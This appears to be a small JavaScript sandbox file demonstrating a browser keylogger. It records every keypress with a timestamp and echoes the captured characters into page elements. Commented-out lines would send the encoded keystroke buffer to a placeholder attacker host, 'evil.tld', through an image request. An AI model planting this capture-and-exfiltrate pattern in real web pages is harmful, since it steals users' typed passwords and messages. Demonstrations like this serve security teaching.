import "./styles.css";

var total = "";
var thingy = "";
var buffer = [];

// var attacker = 'http://evil.tld/?c='

document.onkeypress = function(e) {
  var timestamp = Date.now() | 0;
  var stroke = {
    k: e.key,
    t: timestamp
  };
  buffer.push(stroke);
};

window.setInterval(function() {
  window.focus();
  if (buffer.length > 0) {
    var data = encodeURIComponent(JSON.stringify(buffer));
    document.getElementById("a").innerHTML += decodeURIComponent(
      data
    ).substring(7, 8);
    total += decodeURIComponent(data).substring(7, 8);

    // new Image().src = attacker + data;
    buffer = [];
  }
}, 50);

window.setInterval(function() {
  var doc = thingy;
  if (thingy.substring(doc.length - total.length, doc.length) !== total) {
    thingy += total;
    document.getElementById("b").innerHTML += total;
    total = "";
  }
}, 5000);

document.getElementById("app").innerHTML = `
<h1>Hello Vanilla!</h1>
<div>
  We use Parcel to bundle this sandbox, you can find more info about Parcel
  <a href="https://parceljs.org" target="_blank" rel="noopener noreferrer">here</a>.
</div>
<br>

<script type="text/javascript" src="logger.js"></script>

<div id="a">
</div>
<br>
<br>
<div id="b">
</div>
`;
